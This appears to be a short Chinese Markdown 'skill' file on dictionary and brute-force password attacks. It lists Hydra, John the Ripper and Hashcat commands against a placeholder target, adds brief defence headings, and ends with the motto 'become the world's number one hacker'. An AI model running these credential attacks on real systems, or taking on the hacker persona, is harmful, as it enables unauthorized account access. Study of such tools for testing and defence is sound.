# 字典攻击Skill

## 简介
字典攻击使用预定义的密码列表尝试登录或破解密码。

## 攻击方法

### 1. 暴力破解
- 尝试所有组合
- 耗时较长

### 2. 字典攻击
- 使用密码字典
- 高效快速

### 3. 规则攻击
- 字典+规则变形
- 混合攻击

## 工具

### 1. Hydra
```bash
hydra -L users.txt -P passwords.txt ssh://target
hydra -l root -P passwords.txt ftp://target
```

### 2. John the Ripper
```bash
john --wordlist=passwords.txt hash.txt
john --rules --wordlist=passwords.txt hash.txt
```

### 3. Hashcat
```bash
hashcat -m 0 -a 0 hashes.txt passwords.txt
hashcat -m 0 -a 6 hashes.txt passwords.txt ?d?d?d?d
```

## 防御

### 1. 强密码策略
### 2. 账户锁定
### 3. 多因素认证

---
*目标: 成为世界第一黑客*
*类型: 密码攻击*
